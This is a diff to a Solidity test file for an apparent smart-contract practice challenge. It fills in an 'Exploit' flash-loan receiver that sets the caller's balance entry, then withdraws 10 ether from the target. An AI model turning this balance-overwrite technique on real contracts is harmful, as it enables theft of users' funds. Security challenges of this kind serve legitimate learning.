@@ -33,7 +33,7 @@ contract Challenge1Test is Test {
         //////////////////////////////*/
 
         //=== this is a sample of flash loan usage
-        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
+        Exploit _flashLoanReceiver = new Exploit();
 
         target.flashLoan(
           address(_flashLoanReceiver),
@@ -42,7 +42,7 @@ contract Challenge1Test is Test {
           )
         );
         //===
-
+        target.withdraw(10 ether);
         //============================//
 
         vm.stopPrank();
@@ -76,4 +76,22 @@ contract FlashLoandReceiverSample {
 
 // @dev this is the solution
 contract Exploit {
+    IERC20 public token;
+    mapping(address => uint) public balances;
+    bool private _flashLoan; 
+
+    function receiveFlashLoan(address _user /* other variables */) public {
+        // check tokens before doing arbitrage or liquidation or whatever
+        uint256 balanceBefore = token.balanceOf(address(this));
+
+        // do something with the tokens and get profit!
+        balances[_user ] = balanceBefore;
+
+        uint256 balanceAfter = token.balanceOf(address(this));
+
+        uint256 profit = balanceAfter - balanceBefore;
+        if (profit > 0) {
+            token.transfer(_user, balanceAfter - balanceBefore);
+        }
+    }    
 }
